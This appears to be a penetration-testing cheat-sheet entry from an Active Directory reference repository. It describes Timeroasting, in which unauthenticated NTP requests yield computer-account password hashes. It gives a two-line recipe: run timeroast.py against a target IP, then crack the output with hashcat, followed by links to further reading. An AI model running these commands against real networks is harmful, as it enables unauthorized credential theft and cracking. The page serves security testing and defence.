@@ -1,0 +1,21 @@
+---
+title: Roasting - Timeroasting
+source_url: https://github.com/swisskyrepo/InternalAllTheThings/blob/203bb0c0b290bf7c9158c32d43523b8d66f292c1/docs/active-directory/ad-roasting-timeroasting.md
+fetched_at: 2026-09-20T01:23:21Z
+license: unspecified
+category: ad
+---
+> Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any computer account by sending an NTP request with that account's RID
+
+* [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort
+
+    ```ps1
+    sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
+    hashcat -m 31300 ntp-hashes.txt
+    ```
+
+## References
+
+* [On the Applicability of the Timeroasting Attack - snovvcrash - December 8, 2024](https://snovvcrash.rocks/2024/12/08/applicability-of-the-timeroasting-attack.html)
+* [TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
+* [Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)
